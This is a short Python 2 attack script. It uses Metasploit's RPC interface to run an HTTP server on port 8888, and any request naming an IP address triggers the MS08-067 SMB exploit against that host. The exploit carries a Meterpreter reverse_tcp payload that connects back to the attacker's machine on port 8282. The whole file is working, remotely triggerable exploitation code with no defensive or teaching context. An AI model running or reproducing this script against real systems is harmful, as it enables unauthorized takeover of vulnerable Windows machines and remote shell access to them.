#!/usr/bin/python

import msfrpc, optparse, sys, commands, re
from time import sleep
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

client = msfrpc.Msfrpc({})
client.login('msf', 'test')
console_id = client.call('console.create')['id']
client.call('console.read',[console_id])

LHOST = commands.getoutput("/sbin/ifconfig").split("\n")[1].split()[1][5:]

# Exploits the chain of rc files to exploit MS08-067, setup persistence, and patch
def sploiter (RHOST):
## Exploit MS08-067 ##
  cmds = """use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 8282
set LHOST """+LHOST+"""
set RHOST """+RHOST+"""
set ExitOnSession false
exploit -z
"""
  print "[+] Exploithing MS08-067 on: "+RHOST
  client.call('console.write',[console_id,cmds])

  sleep(10)
  res = client.call('console.read',[console_id])
  print res['data']

class Handler(BaseHTTPRequestHandler):
  def do_GET(self):
    if None != re.search('/((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/', self.path):
      self.wfile.write('OK')
      sploiter(self.path.split('/')[1])
    else:
      self.wfile.write('NULL')

if __name__ == '__main__':
  server = HTTPServer(('',8888), Handler)
  print 'Started WebServer on port 8888...'
  print 'Press ^C to quit webserver'
  server.serve_forever()
